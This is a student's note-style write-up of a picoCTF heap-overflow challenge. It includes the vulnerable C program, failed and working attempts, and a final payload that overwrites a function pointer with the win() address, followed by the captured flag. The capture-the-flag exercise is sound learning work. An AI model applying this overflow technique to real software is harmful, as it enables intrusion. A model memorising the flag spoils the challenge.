---
topic:
course:
tags:
  - picoctf
  - binaryexploitation
  - complete
  - medium
created: 11 Feb 2026 @ 01:39 pm
modified: 11 Feb 2026 @ 04:32 pm
aliases:
---
![[Pasted image 20260211134316.png]]

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}

```


Immediately notice the check win function has changed

```C
void check_win() { ((void (*)())*(int*)x)(); }
```
Ive seen a similar thing before, maybe we have to input the location of the win() function. It must run the code at x - which is the safe variable I think, so we have to modify that to point toward the win function


So we find the location of the function using nm 
![[Pasted image 20260211134131.png]]
We can see main at 401310 
We can see win at 4011a0
difference = hex 170 or decimal 368

Try using same payload - 
asklejhalkejalkesjalkejalkeajelaAAA
to test if we can overflow the same
![[Pasted image 20260211134536.png]]
we can

next figure out how to change it to what we need
we need it to point to the address of the win() function

the hint talks about endians
![[Pasted image 20260211134707.png]]
The right endian for this program
![[Pasted image 20260211134756.png]]
x86-64 endianness = little endian
which means the least signifcant bit is stored at the furtherest right point of the address
So we need to reverse the memory address when we get it

lets try just with the static address through the nm output:
We can see win at 4011a0
40 11 a0
plus padding  to get to 8 bytes
so 
40 11 a0 00 00 00 00 00
reverse
\x00\x00\x00\x00\x00\xa0\x11\x40
using our payload

asklejhalkejalkesjalkejalkeajela\x00\x00\x00\x00\x00\xa0\x11\x40
![[Pasted image 20260211135259.png]]

Didnt work, so we are gunna have to find the address assigned at runtime
main()
![[Pasted image 20260211135713.png]]
win()
![[Pasted image 20260211135625.png]]
 0x00000000004011a0 
 
 check_win()
![[Pasted image 20260211135648.png]]


might just try the address of win
0x00000000004011a0

asklejhalkejalkesjalkejalkeajelaa011040000000000

[[pwn]]


The hint says function pointers, so maybe just 
![[Pasted image 20260211141634.png]]
nope
asklejhalkejalkesjalkejalkeajela

The C code expression `((void (*)())*(int*)x)();` is a complex expression that dereferences a pointer and calls the resulting value as a function. It performs the following steps in order of execution: 
1. **`(int*)x`**: This casts the variable `x` (which is assumed to be a pointer type, e.g., a `void*` or a pointer to some data) to a pointer to an integer (`int*`).
2. **`*(int*)x`**: This dereferences the integer pointer. It treats the memory location pointed to by the cast version of `x` as holding an integer value and retrieves that value. In this specific and likely non-portable context, this integer value is treated as a memory address itself.
3. **`(void (*)())*(int*)x`**: This casts the retrieved integer value to a **function pointer type**. The type `void (*)()` means "a pointer to a function that takes no arguments (void) and returns no value (void)".
4. **`((void (*)())*(int*)x)()`**: This invokes the function pointed to by the resulting function pointer. The empty parentheses `()` indicate a function call with no arguments.


still need the memory address for win() somehow

asklejhalkejalkesjalkejalkeajela

Tried with &win() referencing the memory address of that function

![[Pasted image 20260211141958.png]]
shit did not work

Def need the actual address due to the clue about endianness

HOW?

![[Pasted image 20260211142500.png]]

need to format that address properly

asklejhalkejalkesjalkejalkeajela
payload

```
picopicopicopicopicopicopicopico\xa0\x11\x40\x00
```
\xa0\x1\x11\x40\x00

this is the right way but my payload is not working

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00\x00\x00\x00\x00
```

Format the payload in python
![[Pasted image 20260211144442.png]]

Run it:
![[Pasted image 20260211144424.png]]

```flag
picoCTF{and_down_the_road_we_go_904e3edd}
```



### Lessons learnt
- The enter character was messing up my payload
- Need a way to automate and send the payload , so used a python script with pwntools
- Had already found the address of the win function, but was thrown off when it didn't work, my formatting was wrong, but I didn't know about that.

